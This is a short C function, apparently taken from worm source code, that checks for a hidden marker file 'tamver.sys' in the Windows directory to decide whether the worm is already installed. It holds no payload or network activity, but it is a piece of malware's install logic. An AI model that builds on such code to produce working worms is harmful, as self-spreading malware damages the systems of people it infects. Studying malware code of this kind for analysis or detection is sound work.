   bool WormInstalled(void)
   {
       char        WindowsDir[MAX_PATH];
       HANDLE      FileHandle;

       if(GetWindowsDirectory(WindowsDir, sizeof(WindowsDir)) != 0)
       {
           lstrcat(WindowsDir, "\\tamver.sys");

           FileHandle = CreateFile(WindowsDir, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, 0);

           if(FileHandle != INVALID_HANDLE_VALUE)
           {
               CloseHandle(FileHandle);
               return true;
           }
       }

       return false;
   }
